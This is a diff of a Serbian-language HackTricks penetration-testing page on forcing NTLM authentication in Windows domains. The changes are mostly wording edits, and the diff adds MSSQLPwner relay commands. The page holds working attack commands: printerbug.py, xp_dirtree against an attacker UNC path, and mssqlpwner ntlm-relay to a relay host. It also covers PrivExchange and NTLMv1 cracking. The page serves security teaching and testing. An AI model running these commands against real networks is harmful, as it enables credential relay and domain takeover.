@@ -17,12 +17,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** napisanih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti trećih strana.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** napisanih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.
 
 ## Zloupotreba Spooler Servisa
 
-Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima za štampu i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
-Napomena: kada štampač šalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti račun računara** u ovoj autentifikaciji.
+Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
+Napomena: kada štampač pošalje obaveštenje nekom proizvoljnom sistemu, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti računar kao nalog** u ovoj autentifikaciji.
 
 ### Pronalaženje Windows Servera na domenu
 
@@ -54,7 +54,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kombinovanje sa Neograničenom Delegacijom
 
-Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **naterati štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** **računarskog naloga štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Kako je napadač već kompromitovao ovaj host, moći će da **izvuče ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
+Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **da natera štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** računa **računara štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Pošto je napadač već kompromitovao ovaj host, moći će da **izvuče ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Prisilna autentifikacija
 
@@ -62,9 +62,9 @@ Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unco
 
 ## PrivExchange
 
-Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da bilo koji korisnik domena sa poštanskim sandučetom natera Exchange server da se autentifikuje na bilo kojem hostu koji obezbeđuje klijent preko HTTP-a.
+Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da Exchange server bude primoran od strane bilo kog korisnika domena sa poštanskim sandučetom da se autentifikuje na bilo kojem hostu koji obezbeđuje klijent preko HTTP-a.
 
-Podrazumevano, **Exchange usluga se pokreće kao SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno izvlačenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administraciji Domenom sa bilo kojim autentifikovanim korisničkim nalogom domena.
+Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti da omogući **preusmeravanje informacija na LDAP i naknadno ekstraktovanje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administratoru Domena sa bilo kojim autentifikovanim korisničkim nalogom domena.
 
 ## Unutar Windows-a
 
@@ -77,6 +77,17 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ### MSSQL
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+```
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
 Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
@@ -104,20 +115,20 @@ Ako možete da izvršite MitM napad na računar i ubacite HTML u stranicu koju �
 ```
 ## Cracking NTLMv1
 
-Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih hakovati](../ntlm/#ntlmv1-attack).\
-_Pamti da da bi hakovao NTLMv1 treba da postaviš Responder izazov na "1122334455667788"_
+Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/#ntlmv1-attack).\
+_Pametite da da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
 
 {% hint style="success" %}
-Uči i vežbaj AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Uči i vežbaj GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Podrži HackTricks</summary>
+<summary>Podržite HackTricks</summary>
 
-* Proveri [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridruži se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **prati** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podeli hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
